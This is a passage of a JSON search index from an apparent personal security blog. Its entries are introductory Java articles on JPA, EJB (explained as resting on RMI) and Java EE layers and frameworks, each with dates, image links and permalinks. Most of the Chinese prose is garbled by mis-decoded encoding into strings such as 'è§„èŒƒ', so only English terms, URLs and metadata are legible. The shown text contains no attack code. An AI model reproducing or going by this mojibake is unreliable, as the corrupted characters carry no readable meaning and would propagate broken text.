è§„èŒƒçš„æ¥å£ï¼Œä½†åº•å±‚çš„JPAå®ç°å¯ä»¥ä»»æ„åˆ‡æ¢ï¼šè§‰å¾—Hibernateå¥½çš„ï¼Œå¯ä»¥é€‰æ‹©Hibernate JPAå®ç°ï¼›è§‰å¾—TopLinkå¥½çš„ï¼Œå¯ä»¥é€‰æ‹©TopLink JPAå®ç°ã€‚\nå¼€å‘è€…å¯ä»¥é¿å…ä¸ºä½¿ç”¨Hibernateå­¦ä¹ ä¸€å¥—ORMæ¡†æ¶ï¼Œä¸ºä½¿ç”¨TopLinkåˆè¦å†å­¦ä¹ ä¸€å¥—ORMæ¡†æ¶ã€‚\nJPAä¸ºæˆ‘ä»¬æä¾›äº†ä»¥ä¸‹è§„èŒƒï¼š\nORMæ˜ å°„å…ƒæ•°æ®ï¼šJPAæ”¯æŒXMLå’Œæ³¨è§£ä¸¤ç§å…ƒæ•°æ®çš„å½¢å¼ï¼Œå…ƒæ•°æ®æè¿°å¯¹è±¡å’Œè¡¨ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œæ¡†æ¶æ®æ­¤å°†å®ä½“å¯¹è±¡æŒä¹…åŒ–åˆ°æ•°æ®åº“è¡¨ä¸­ JPAçš„Criteria APIï¼šæä¾›APIæ¥æ“ä½œå®ä½“å¯¹è±¡ï¼Œæ‰§è¡ŒCRUDæ“ä½œï¼Œæ¡†æ¶ä¼šè‡ªåŠ¨å°†ä¹‹è½¬æ¢ä¸ºå¯¹åº”çš„SQLï¼Œä½¿å¼€å‘è€…ä»ç¹ççš„ JDBCã€SQLä¸­è§£æ”¾å‡ºæ¥ã€‚ JPQLæŸ¥è¯¢è¯­è¨€ï¼šé€šè¿‡é¢å‘å¯¹è±¡è€Œéé¢å‘æ•°æ®åº“çš„æŸ¥è¯¢è¯­è¨€æŸ¥è¯¢æ•°æ®ï¼Œé¿å…ç¨‹åºçš„SQLè¯­å¥ç´§å¯†è€¦åˆã€‚ After All JPAæ˜¯ä¸€ä¸ªå®šä¹‰Javaåº”ç”¨ç¨‹åºæŒä¹…æ€§æ¦‚å¿µçš„è§„èŒƒ JPAæä¾›äº†ä¸€ä¸ªORMå±‚ï¼ŒæŠ½è±¡äº†Javaå¯¹è±¡å’Œå…³ç³»æ•°æ®åº“ä¹‹é—´çš„è½¬æ¢ æµè¡Œçš„JPAå®ç°åŒ…æ‹¬Hibernateå’ŒEclipseLink Ref https://www.infoworld.com/article/2259807/what-is-jpa-introduction-to-the-java-persistence-api.html\n","date":"2024-11-22T15:28:55+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241122153243285.png","permalink":"https://d4n-sec.github.io/p/javaaboutjpa/","title":"JavaåŸºç¡€çŸ¥è¯†ï¼šJPA"},{"content":"What\u0026rsquo;s EJB EJB =\u0026gt; Enterprise Java Beans\nç›´è¯‘ï¼šä¼ä¸š Java Beans\nEJB çš„å®˜æ–¹è§£é‡Šï¼š\nå•†åŠ¡è½¯ä»¶çš„æ ¸å¿ƒéƒ¨åˆ†æ˜¯å®ƒçš„ä¸šåŠ¡é€»è¾‘ã€‚ä¸šåŠ¡é€»è¾‘æŠ½è±¡äº†æ•´ä¸ªå•†åŠ¡è¿‡ç¨‹çš„æµç¨‹ï¼Œå¹¶ä½¿ç”¨è®¡ç®—æœºè¯­è¨€å°†ä»–ä»¬å®ç°ã€‚\næ‰€è°“ï¼š\u0026quot;ä¸šåŠ¡é€»è¾‘\u0026quot; æˆ‘ä»¬æ³¨æ„åˆ°åœ¨EJB çš„æ¦‚å¿µä¸­ä¸»è¦æåˆ°çš„å°±æ˜¯\u0026quot;ä¸šåŠ¡é€»è¾‘\u0026quot;çš„å°è£…ï¼Œè€Œè¿™ä¸ªä¸šåŠ¡é€»è¾‘åˆ°åº•æ˜¯ä»€ä¹ˆï¼Ÿè¯´çš„é‚£ä¹ˆæ‚¬ä¹ï¼Œå…¶å®è¿™ä¸ªæ‰€è°“çš„\u0026quot;ä¸šåŠ¡é€»è¾‘\u0026quot;æˆ‘ä»¬å®Œå…¨å¯ä»¥ç†è§£æˆæ‰§è¡Œç‰¹å®šä»»åŠ¡çš„\u0026quot;ç±»\u0026quot;ã€‚\nå‰–æ2ï¼šæ‰€è°“ï¼š\u0026quot;å°†ä¸šåŠ¡é€»è¾‘ä»å®¢æˆ·ç«¯è½¯ä»¶ä¸­æŠ½å–å‡ºæ¥ï¼Œå°è£…åœ¨ç»„ä»¶ä¸­â€¦â€¦è¿è¡Œåœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Š\u0026quot; æ—¢ç„¶æˆ‘ä»¬çŸ¥é“äº†\u0026quot;ä¸šåŠ¡é€»è¾‘\u0026quot;çš„æ¦‚å¿µå°±æ˜¯æ‰§è¡Œç‰¹å®šä»»åŠ¡çš„\u0026quot;ç±»\u0026quot;ï¼Œé‚£ä¹ˆï¼Œä»€ä¹ˆå«\u0026quot;ä»å®¢æˆ·ç«¯è½¯ä»¶ä¸­æŠ½å–å‡ºæ¥\u0026quot;ï¼Ÿå…¶å®ï¼Œè¿™ä¸ªå°±æ˜¯æŠŠåŸæ¥æ”¾åˆ°å®¢æˆ·ç«¯çš„\u0026quot;ç±»\u0026quot;ï¼Œæ‹¿å‡ºæ¥ä¸æ”¾åˆ°å®¢æˆ·ç«¯äº†ï¼Œæ”¾åˆ°ä¸€ä¸ªç»„ä»¶ä¸­ï¼Œå¹¶å°†è¿™ä¸ªç»„ä»¶æ”¾åˆ°ä¸€ä¸ªæœåŠ¡å™¨ä¸Šå»è¿è¡Œã€‚\nHow to Do ä»ä¸Šé¢çš„åˆ†æä¸­ï¼Œå¯ä»¥å¾—çŸ¥ï¼Œåšæ³•æ˜¯ï¼š\u0026ldquo;æŠŠä½ ç¼–å†™çš„è½¯ä»¶ä¸­é‚£äº›éœ€è¦æ‰§è¡Œåˆ¶å®šçš„ä»»åŠ¡çš„ç±»ï¼Œä¸æ”¾åˆ°å®¢æˆ·ç«¯è½¯ä»¶ä¸Šäº†ï¼Œè€Œæ˜¯ç»™ä»–æ‰“æˆåŒ…æ”¾åˆ°ä¸€ä¸ªæœåŠ¡å™¨ä¸Šäº†\u0026rdquo;ã€‚\nä¸ç®¡æ˜¯ç”¨\u0026quot;å…«è‚¡æ–‡\u0026quot;è¯´ï¼Œè¿˜æ˜¯ç”¨å¤§ç™½è¯è¯´è¿™ä¸ª EJB æ¦‚å¿µéƒ½æåˆ°äº†ä¸€ä¸ªè¯ å®¢æˆ·ç«¯è½¯ä»¶ã€‚å®¢æˆ·ç«¯è½¯ä»¶ï¼Ÿéš¾é“ EJB çš„æ¦‚å¿µä¸­è¯´çš„æ˜¯C/S è½¯ä»¶ï¼Ÿ\næ˜¯çš„ï¼Œæ²¡é”™ï¼\nEJB å°±æ˜¯å°†é‚£äº›\u0026quot;ç±»\u0026quot;æ”¾åˆ°ä¸€ä¸ªæœåŠ¡å™¨ä¸Šï¼Œç”¨ C/S å½¢å¼çš„è½¯ä»¶å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨ä¸Šçš„\u0026quot;ç±»\u0026quot;è¿›è¡Œè°ƒç”¨ã€‚\nPrinciple of EJB å†æ¥åˆ†æ EJB çš„åº•å±‚å®ç°æŠ€æœ¯ï¼Œé€šè¿‡åº•å±‚å®ç°æŠ€æœ¯æ¥åˆ†æEJB çš„å·¥ä½œæ–¹å¼ã€‚\nEJB æ˜¯è¿è¡Œåœ¨ç‹¬ç«‹æœåŠ¡å™¨ä¸Šçš„ç»„ä»¶ï¼Œå®¢æˆ·ç«¯æ˜¯é€šè¿‡ç½‘ç»œå¯¹EJB å¯¹è±¡è¿›è¡Œè°ƒç”¨çš„ã€‚åœ¨Javaä¸­ï¼Œèƒ½å¤Ÿå®ç°è¿œç¨‹å¯¹è±¡è°ƒç”¨çš„æŠ€æœ¯æ˜¯RMIï¼Œè€ŒEJB æŠ€æœ¯åŸºç¡€æ­£æ˜¯RMIã€‚é€šè¿‡RMI æŠ€æœ¯ï¼ŒJ2EE å°†EJB ç»„ä»¶åˆ›å»ºä¸ºè¿œç¨‹å¯¹è±¡ï¼Œå®¢æˆ·ç«¯å°±å¯ä»¥é€šè¿‡ç½‘ç»œè°ƒç”¨ EJB å¯¹è±¡äº†ã€‚\nä»€ä¹ˆæ˜¯ RMI ï¼Ÿç‚¹è¿™é‡Œ\nä¼˜ç‚¹ä¸ç¼ºç‚¹ ä¼˜ç‚¹ è¿™ç§æœºåˆ¶ç»™åˆ†å¸ƒè®¡ç®—çš„ç³»ç»Ÿè®¾è®¡ã€ç¼–ç¨‹éƒ½å¸¦æ¥äº†æå¤§çš„æ–¹ä¾¿ã€‚åªè¦æŒ‰ç…§RMI è§„åˆ™è®¾è®¡ç¨‹åºï¼Œå¯ä»¥ä¸å¿…å†è¿‡é—®åœ¨RMI ä¹‹ä¸‹çš„ç½‘ç»œç»†èŠ‚äº†ï¼Œå¦‚ï¼šTCP å’ŒSocket ç­‰ç­‰ã€‚ä»»æ„ä¸¤å°è®¡ç®—æœºä¹‹é—´çš„é€šè®¯å®Œå…¨ç”±RMI è´Ÿè´£ã€‚è°ƒç”¨è¿œç¨‹è®¡ç®—æœºä¸Šçš„å¯¹è±¡å°±åƒæœ¬åœ°å¯¹è±¡ä¸€æ ·æ–¹ä¾¿ã€‚RMI å¯å°†å®Œæ•´çš„å¯¹è±¡ä½œä¸ºå‚æ•°å’Œè¿”å›å€¼è¿›è¡Œä¼ é€’ï¼Œè€Œä¸ä»…ä»…æ˜¯é¢„å®šä¹‰çš„æ•°æ®ç±»å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥å°†ç±»ä¼¼Java å“ˆè¥¿è¡¨è¿™æ ·çš„å¤æ‚ç±»å‹ä½œä¸ºä¸€ä¸ªå‚æ•°è¿›è¡Œä¼ é€’ã€‚\nç¼ºç‚¹ å¦‚æœæ˜¯è¾ƒä¸ºç®€å•çš„æ–¹æ³•è°ƒç”¨ï¼Œå…¶æ‰§è¡Œæ•ˆç‡ä¹Ÿè®¸ä¼šæ¯”æœ¬åœ°æ‰§è¡Œæ…¢å¾ˆå¤šï¼Œå³ä½¿å’Œè¿œç¨‹Socketæœºåˆ¶çš„ç®€å•æ•°æ®è¿”å›çš„åº”ç”¨ç›¸æ¯”ï¼Œä¹Ÿä¼šæ…¢ä¸€äº›ï¼ŒåŸå› æ˜¯ï¼Œå…¶åœ¨ç½‘ç»œé—´éœ€è¦ä¼ é€’çš„ä¿¡æ¯ä¸ä»…ä»…åŒ…å«è¯¥å‡½æ•°çš„è¿”å›å€¼ä¿¡æ¯ï¼Œè¿˜ä¼šåŒ…å«è¯¥å¯¹è±¡åºåˆ—åŒ–åçš„å­—èŠ‚å†…å®¹ã€‚\nEJB æ˜¯ä»¥ RMI ä¸ºåŸºç¡€çš„ é€šè¿‡RMI æŠ€æœ¯ï¼ŒJ2EE å°†EJB ç»„ä»¶åˆ›å»ºä¸ºè¿œç¨‹å¯¹è±¡ï¼ŒEJB è™½ç„¶ç”¨äº†RMI æŠ€æœ¯ï¼Œä½†æ˜¯å´åªéœ€è¦å®šä¹‰è¿œç¨‹æ¥å£è€Œæ— éœ€ç”Ÿæˆä»–ä»¬çš„å®ç°ç±»ï¼Œè¿™æ ·å°±å°†RMI æŠ€æœ¯ä¸­çš„ä¸€äº›ç»†èŠ‚é—®é¢˜å±è”½äº†ã€‚ä½†ä¸ç®¡æ€ä¹ˆè¯´ï¼ŒEJB çš„åŸºç¡€ä»ç„¶æ˜¯RMIï¼Œæ‰€ä»¥ï¼Œå¦‚æœä½ æƒ³äº†è§£EJB çš„åŸç†ï¼Œåªè¦æŠŠRMIçš„åŸç†ææ¸…æ¥šå°±è¡Œäº†ã€‚ä½ ä¹Ÿå°±å¼„æ¸…æ¥šäº†ä»€ä¹ˆæ—¶å€™ç”¨EJB ä»€ä¹ˆæ—¶å€™ä¸éœ€è¦ç”¨EJB äº†ã€‚\nWhen Use It é€šè¿‡ä¸Šé¢å°èŠ‚çš„è®²è§£ä¼¼ä¹å¥½åƒ EJB å’Œå¼€å‘ Web åº”ç”¨çš„B/S ç»“æ„çš„ç³»ç»Ÿå…³ç³»å¹¶ä¸å¤§ï¼Œå…¶å®å€’ä¹Ÿä¸ç„¶ã€‚æˆ‘ä»¬å¦‚æœæŠŠ\u0026quot;å®¢æˆ·ç«¯ç¨‹åº\u0026quot;ç†è§£æˆæŸä¸€å°æœåŠ¡å™¨ï¼Œè¿™æ ·ä¹Ÿæ˜¯å¯ä»¥è¢«åº”ç”¨çš„ï¼Œè€Œä¸”ï¼Œå¦‚æœæ˜¯æœåŠ¡å™¨äº’ç›¸ä¹‹é—´åš EJB çš„è°ƒç”¨çš„è¯ï¼Œä¹Ÿå°±ä¸å­˜åœ¨å¹¿åŸŸç½‘å¸¦å®½é™åˆ¶çš„é—®é¢˜äº†ã€‚ä½†æ˜¯ï¼Œå¦‚ä¸‹æƒ…å†µå°½é‡å°±ä¸è¦ä½¿ç”¨EJB äº†ï¼š\nè¾ƒä¸ºç®€å•çš„çº¯Web åº”ç”¨å¼€å‘ï¼Œä¸éœ€è¦ç”¨EJBã€‚ éœ€è¦ä¸å…¶ä»–æœåŠ¡ç¨‹åºé…åˆä½¿ç”¨çš„åº”ç”¨ï¼Œä½†è°ƒç”¨æˆ–è¿”å›çš„è‡ªå®šä¹‰çš„ç½‘ç»œåè®®å¯ä»¥è§£å†³çš„åº”ç”¨ç¨‹åº,ä¸éœ€è¦ä½¿ç”¨EJBã€‚ è¾ƒå¤šäººå¹¶å‘è®¿é—®çš„C/S ç»“æ„çš„åº”ç”¨ç¨‹åºï¼Œå°½é‡ä¸è¦ä½¿ç”¨EJBã€‚ After All EJBå®ç°åŸç†ï¼š å°±æ˜¯æŠŠåŸæ¥æ”¾åˆ°å®¢æˆ·ç«¯å®ç°çš„ä»£ç æ”¾åˆ°æœåŠ¡å™¨ç«¯ï¼Œå¹¶ä¾é RMIè¿›è¡Œé€šä¿¡ã€‚\nRMIå®ç°åŸç† ï¼šå°±æ˜¯é€šè¿‡Javaå¯¹è±¡å¯åºåˆ—åŒ–æœºåˆ¶å®ç°åˆ†å¸ƒè®¡ç®—ã€‚\næœåŠ¡å™¨é›†ç¾¤ï¼š å°±æ˜¯é€šè¿‡RMIçš„é€šä¿¡ï¼Œè¿æ¥ä¸åŒåŠŸèƒ½æ¨¡å—çš„æœåŠ¡å™¨ï¼Œä»¥å®ç°ä¸€ä¸ªå®Œæ•´çš„åŠŸèƒ½ã€‚\nRef https://blog.csdn.net/kouzhaokui/article/details/89176541\n","date":"2024-11-22T15:01:58+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20241122152021833.png","permalink":"https://d4n-sec.github.io/p/javaaboutejb/","title":"JavaåŸºç¡€çŸ¥è¯†ï¼šEJB"},{"content":" æ¦‚å¿µå¤šä¸”æ‚ï¼Œä¸”çœ‹ä¸”è¿‡ JAVA \u0026amp; J2EE Javaå’ŒJava EEï¼ˆä¹Ÿå¯ç§°J2EEï¼Œå…¶ä¸­çš„æ•…äº‹ï¼‰æ˜¯ä¸¤ä¸ªä¸åŒæ¦‚å¿µ\nJavaä¸ä»…æŒ‡ä¸€ç§è¯­è¨€ï¼Œä¹Ÿå¯ä»¥æŒ‡ä¸€ç§è½¯ä»¶ç³»ç»Ÿçš„æµæ´¾\nç›®å‰JAVAæœ‰ä¸‰ä¸ªå¹³å°ï¼š\né€‚ç”¨äºå°å‹è®¾å¤‡å’Œæ™ºèƒ½å¡çš„Javaå¹³å°Microç‰ˆ\nJava Platform Micro Edition=\u0026gt;Java ME\né€‚ç”¨äºæ¡Œé¢ç³»ç»Ÿçš„Javaå¹³å°æ ‡å‡†ç‰ˆ\nJava Platform Standard Edition=\u0026gt;Java SE\né€‚ç”¨äºåˆ›å»ºæœåŠ¡å™¨åº”ç”¨ç¨‹åºå’ŒæœåŠ¡çš„Javaå¹³å°ä¼ä¸šç‰ˆ\nJava Platform EnterPrise Edition=\u0026gt;Java EE\nJava EEæ˜¯å°†æ‰€æœ‰åŸºäºJavaçš„ä¼ä¸šåº”ç”¨å¼€å‘æŠ€æœ¯é›†åˆåœ¨ä¸€ä¸ªä½“ç³»ç»“æ„ä¸‹çš„å¹³å°\nä¼ä¸šåº”ç”¨å¼€å‘ ä¼ä¸šåº”ç”¨å¼€å‘è¦†ç›–é¢æ¯”è¾ƒå¹¿æ³›ï¼ŒåŸºæœ¬ä¸Šéƒ½æ˜¯å›´ç»•æ•°æ®ä¸­å¿ƒå¼çš„Webåº”ç”¨\nä¸»æµWebå¼€å‘æŠ€æœ¯ Javaï¼šSpringBootï¼ŒJavaEE SSHï¼ŒSSM C#: Asp.net Pythonï¼š Django, Flask PHPï¼š Laraveï¼ŒThinkPHPï¼ŒCodeIgnite Node.js: Express, Koa å‰ç«¯ï¼šJavaScriptï¼ŒHtml, CSS, Vueï¼Œ react ç§»åŠ¨å¼€å‘ã€æ•°æ®åº“å¼€å‘è¿™ä¸‰å¤§é¢†åŸŸçš„ä¸»æµæŠ€æœ¯éƒ½å¯ä»¥å…³æ³¨\næ•°æ®åº“ ç»å¤§å¤šæ•°ä¼ä¸šåº”ç”¨éƒ½ä¼šä½¿ç”¨åˆ°æ•°æ®åº“\nå…³ç³»å‹æ•°æ®åº“ MySQLï¼ŒSQL Serverï¼ŒPostgreSQL éå…³ç³»å‹æ•°æ®åº“ MongoDBï¼ŒCounchbase äº‘æœåŠ¡ Firebaseï¼ŒAWSï¼ŒDocumentDBï¼ŒAzure è½»é‡çº§ SQLiteï¼ŒNeDBï¼ŒRedis æ¡†æ¶ç»„åˆ åœ¨å¸‚é¢ä¸Šå¤§å®¶å¸¸ç”¨å¦‚ä¸‹çš„æ¡†æ¶ç»„åˆï¼Œå¯ä»¥å‘æŒ¥å„æ¡†æ¶çš„æœ€å¤§ä¼˜åŠ¿ï¼Œè‰¯å¥½çš„è§£å†³ä¼ä¸šçº§åº”ç”¨çš„éœ€æ±‚\nStruts+Spring+Hibernateæ¡†æ¶ï¼ˆSSHæ¡†æ¶ï¼‰ SpringMVC+Spring+Hibernateæ¡†æ¶ SpringMVC+Spring+MyBatisæ¡†æ¶ï¼ˆSSMæ¡†æ¶ï¼‰ å…¶ä»–ç†è§£\njava EEæ˜¯é¢å‘ä¼ä¸šå¼€å‘ç”¨çš„javaç‰ˆæœ¬ã€‚ J2EEä½¿ç”¨å¤šå±‚çš„åˆ†å¸ƒå¼åº”ç”¨æ¨¡å‹ï¼Œæœ‰çš„åˆ†å››å±‚æœ‰çš„åˆ†ä¸‰å±‚ï¼Œå…¶å®éƒ½æ˜¯å·®ä¸å¤šçš„ã€‚æˆ‘è¿™é‡Œåˆ†ä¸‰å±‚ï¼šè¡¨ç°å±‚ï¼ˆUIï¼‰ã€ä¸šåŠ¡é€»è¾‘å±‚ï¼ˆBLLï¼‰ã€æ•°æ®è®¿é—®å±‚/æŒä¹…å±‚æ¡†æ¶ï¼ˆDALï¼‰ã€‚ åœ¨ä¸åŒçš„å±‚ä¸Šä½¿ç”¨ä¸åŒçš„æ¡†æ¶ï¼Œé‚£ä¹ˆï¼Œä¸åŒçš„å±‚ä¸Šéƒ½æœ‰å¦‚ä¸‹çš„æ¡†æ¶ï¼š è¡¨ç°å±‚æ¡†æ¶ï¼šSpringMVCæ¡†æ¶ï¼ŒStruts2æ¡†æ¶ã€JSFæ¡†æ¶ã€Tapestryæ¡†æ¶ã€WebWorkæ¡†æ¶ ä¸šåŠ¡é€»è¾‘å±‚æ¡†æ¶ï¼šSpringæ¡†æ¶ æŒä¹…å±‚æ¡†æ¶ï¼šHibernateæ¡†æ¶ã€MyBatis\nJava EE Java EEæ˜¯å°†æ‰€æœ‰åŸºäºJavaçš„ä¼ä¸šåº”ç”¨å¼€å‘æŠ€æœ¯é›†åˆåœ¨ä¸€ä¸ªä½“ç³»ç»“æ„ä¸‹çš„å¹³å°\nä¸Microsoftå…¬å¸çš„.Netç›¸æ¯”ï¼Œ Java EEæ›´èƒ½æ»¡è¶³äº’è”ç½‘åœ¨æ™ºèƒ½åŒ–WebæœåŠ¡æ–¹é¢çš„å¼€æ”¾æ€§ã€åˆ†å¸ƒæ€§å’Œå¹³å°æ— å…³æ€§\nè¿ç”¨JavaæŠ€æœ¯å¼€å‘ä¼ä¸šåº”ç”¨çš„æ ‡å‡†\nå¤šå±‚åº”ç”¨å¼€å‘æ¨¡å‹ å¼€å‘å¹³å° - APIs å’ŒæœåŠ¡ æµ‹è¯•è½¯ä»¶åŒ… å‚è€ƒå®ç° Java EEå¹³å°å·²ç»æˆä¸ºç”µä¿¡ã€é‡‘èã€ç”µå­å•†åŠ¡ã€ä¿é™©ã€è¯åˆ¸ç­‰å„è¡Œä¸šçš„å¤§å‹ç³»ç»Ÿçš„é¦–é€‰å¼€å‘å¹³å°\nJava EEå¤§è‡´åˆ†ä¸ºå‡ ç§æ–¹å¼ï¼š\nä»¥EJB3+JPAä¸ºæ ¸å¿ƒçš„ç»å…¸Java EEå¼€å‘å¹³å°ã€‚ ä»¥Springä¸ºæ ¸å¿ƒçš„è½»é‡çº§Java EEä¼ä¸šå¼€å‘å¹³å°ã€‚ åŸºäºSpring boot,Spring cloudå¼€å‘ Java EEåº”ç”¨åˆ†å±‚ç»“æ„ è¡¨ç°å±‚ï¼šæ­¤å±‚ç”±ç³»åˆ—çš„jspé¡µé¢ã€Velocityé¡µé¢ã€PDFæ–‡æ¡£è§†å›¾ç»„ä»¶ç»„æˆï¼Œè´Ÿè´£æ”¶é›†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶æ˜¾ç¤ºå¤„ç†ç»“æœã€‚ æ§åˆ¶å™¨å±‚ï¼šæ­¤å±‚ç”±ç³»åˆ—æ§åˆ¶å™¨ç»„æˆï¼Œè¿™äº›æ§åˆ¶å™¨ç”¨äºæ‹¦æˆªç”¨æˆ·è¯·æ±‚ï¼Œå¹¶è°ƒç”¨ä¸šåŠ¡é€»è¾‘ç»„ä»¶çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ï¼Œå¤„ç†ç”¨æˆ·è¯·æ±‚ï¼Œå¹¶æ ¹æ®å¤„ç†ç»“æœè½¬å‘åˆ°ä¸åŒçš„è¡¨ç°å±‚ç»„ä»¶ã€‚ ä¸šåŠ¡é€»è¾‘å±‚ï¼šæ­¤å±‚ç”±ç³»åˆ—çš„ä¸šåŠ¡é€»è¾‘å¯¹è±¡ç»„æˆ ä¸šåŠ¡é€»è¾‘å¯¹è±¡å®ç°äº†ç³»ç»Ÿæ‰€éœ€è¦çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ã€‚è¿™äº›ä¸šåŠ¡é€»è¾‘æ–¹æ³•å¯èƒ½æ˜¯ä¾èµ–DAOç»„ä»¶å®ç°çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³•ï¼Œä¹Ÿå¯èƒ½ä»…ä»…ç”¨äºæš´éœ²Domain Objectå¯¹è±¡æ‰€å®ç°çš„ä¸šåŠ¡é€»è¾‘æ–¹æ³• æ•°æ®è®¿é—®å¯¹è±¡ï¼ˆData Access Objectï¼ŒDAOï¼‰å±‚ï¼šæ­¤å±‚ç”±ç³»åˆ—çš„DAOç»„æˆï¼Œè¿™äº›DAOå®ç°äº†å¯¹æ•°æ®åº“çš„åˆ›å»ºã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤ï¼ˆCRUDï¼‰ç­‰åŸå­æ“ä½œã€‚ é¢†åŸŸå¯¹è±¡ï¼ˆDomain Object ï¼‰å±‚ï¼šæ­¤å±‚ç”±ç³»åˆ—çš„POJOï¼ˆPlain Old Java Objectï¼Œæ™®é€šä¼ ç»Ÿçš„Javaå¯¹è±¡ï¼‰ Java EEçš„ç»„ä»¶å’Œå®¹å™¨ ç»„ä»¶ï¼šJavaEEåŸºæœ¬çš„è½¯ä»¶å•å…ƒ â€”â€” é¢åŒ…\nå®¹å™¨ï¼šåˆ†å¸ƒå¼ç»„ä»¶çš„è¿è¡Œç¯å¢ƒ â€”â€” çƒ¤ç®±\nå®¹å™¨ä¸ºç»„ä»¶æä¾›å¿…éœ€çš„åº•å±‚åŸºç¡€åŠŸèƒ½ â€”â€” æœåŠ¡\njavaEEçš„å®¹å™¨ç”±å‚å•†å®ç°,javaEEæœåŠ¡å™¨ä¸­å‡åŒ…å«Webå®¹å™¨å’ŒEJBå®¹å™¨çš„å®ç° å¦‚JDBCã€JMSã€JNDIæœåŠ¡ã€æŒä¹…åŒ–ã€äº‹åŠ¡æ”¯æŒã€å¹¶å‘ã€å®‰å…¨æ€§ã€èµ„æºå’Œç”Ÿå‘½å‘¨æœŸç®¡ç† è½»é‡çº§Java EEæ¶æ„ ä¼ä¸šJavaç›¸å…³æŠ€æœ¯\nJSPã€Servletå’ŒJavaBean\nStruts 2/SpringMVC\nHibernate/MyBatis\nSpring\nStruts2/SpringMVC+Spring+Hibernate/MyBatis\nStruts2/Spring MVCè¿›è¡Œæµç¨‹æ§åˆ¶ï¼ŒSpringè¿›è¡Œä¸šåŠ¡æµè½¬,Hibernate/Mybatisè¿›è¡Œæ•°æ®åº“æ“ä½œçš„å°è£…\næ•´ä½“æ¡†æ¶å’Œä¸šåŠ¡å±‚ç”¨Springï¼Œæ§åˆ¶å±‚ç”¨Struts/Spring MVCï¼Œè€ŒæŒä¹…å±‚ç”¨Hibernate/MyBatis\nJSPã€Servletå’ŒJavaBean JSP JSPï¼šå…¨ç§°æ˜¯JavaServer Pageã€‚åœ¨htmlé¡µé¢ä¸­åµŒå…¥JSPæ ‡è®°å’Œè„šæœ¬ä»£ç ã€‚JSPæŠŠé™æ€å†…å®¹å’ŒåŠ¨æ€å†…å®¹çš„åˆ†ç¦»ï¼Œå®ç°äº†å†…å®¹å’Œè¡¨ç¤ºçš„åˆ†ç¦»ã€‚\nJSPï¼ŒServletæ˜¯æœ€æ—©çš„Java EEè§„èŒƒä¹‹ä¸€ï¼Œ åŒå±è¡¨ç°å±‚ï¼Œéƒ½å±äºâ€œåŠ¨æ€ç½‘é¡µæŠ€æœ¯â€\né™æ€ç½‘é¡µæŠ€æœ¯å°±æ˜¯æŠŠåšå¥½çš„htmlæ–‡ä»¶ç›´æ¥ä¸Šä¼ åˆ°æœåŠ¡å™¨å¹¶ç›´æ¥ä¾›å®¢æˆ·æµè§ˆ\nåŠ¨æ€ç½‘é¡µæŠ€æœ¯åˆ™æ˜¯æ¯æ¬¡éƒ½æ ¹æ®ç”¨æˆ·è¯·æ±‚ï¼ŒåŠ¨æ€ç”Ÿæˆå“åº”é¡µé¢å¹¶è¿”å›ã€‚\nä¼˜åŠ¿:çµæ´»æ€§ï¼Œæ•°æ®ä¿å¯†æ€§\nServlet JSPå¿…é¡»è¢«WebæœåŠ¡å™¨ç¿»è¯‘æˆServletï¼ŒçœŸæ­£åœ¨WebæœåŠ¡å™¨å†…è¿è¡Œçš„æ˜¯Servletã€‚\nServletï¼šå®é™…ä¸Šå°±æ˜¯æŒ‰ç…§Servletè§„èŒƒç¼–å†™çš„ä¸€ä¸ªjavaç±»ï¼Œä¸ä¼ ç»Ÿçš„å‘½ä»¤è¡Œå¯åŠ¨çš„Javaåº”ç”¨ç¨‹åºä¸åŒï¼ŒServletä½äºWebæœåŠ¡å™¨å†…éƒ¨ï¼Œå¹¶ç”±WebæœåŠ¡å™¨åŠ è½½å¹¶è°ƒç”¨ã€‚\nJavaBean JavaBean æ˜¯ä¸€ç§JAVAè¯­è¨€å†™æˆçš„å¯é‡ç”¨ç»„ä»¶ï¼Œä¸€ç§ç‰¹æ®Šçš„Javaç±»ï¼Œå°±æ˜¯æœ‰é»˜è®¤æ„é€ æ–¹æ³•ï¼Œåªæœ‰get,setçš„æ–¹æ³•çš„javaç±»çš„å¯¹è±¡\nJavaBeanåˆ†ä¸ºå¯è§†åŒ–ç»„ä»¶å’Œéå¯è§†åŒ–ç»„ä»¶\nå¯è§†åŒ–ç»„ä»¶å¯ä»¥æ˜¯ç®€å•çš„GUIå…ƒç´ ï¼Œå¦‚æŒ‰é’®æˆ–æ–‡æœ¬æ¡†ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤æ‚çš„ï¼Œå¦‚æŠ¥è¡¨ç»„ä»¶ éå¯è§†åŒ–ç»„ä»¶æ²¡æœ‰GUIè¡¨ç°å½¢å¼ï¼Œç”¨äºå°è£…ä¸šåŠ¡é€»è¾‘ã€æ•°æ®åº“æ“ä½œç­‰ æœ€å¤§ä¼˜ç‚¹åœ¨äºå¯ä»¥å®ç°ä»£ç çš„å¯é‡ç”¨æ€§\nStruts 2 Strutså…¶ä¸»è¦çš„è®¾è®¡ç†å¿µæ˜¯é€šè¿‡æ§åˆ¶å™¨å°†è¡¨ç°é€»è¾‘å’Œä¸šåŠ¡é€»è¾‘è§£è€¦ï¼Œä»¥æé«˜ç³»ç»Ÿçš„å¯ç»´æŠ¤æ€§ã€å¯æ‰©å±•æ€§å’Œå¯é‡ç”¨æ€§ã€‚\nStrutsæ˜¯Java 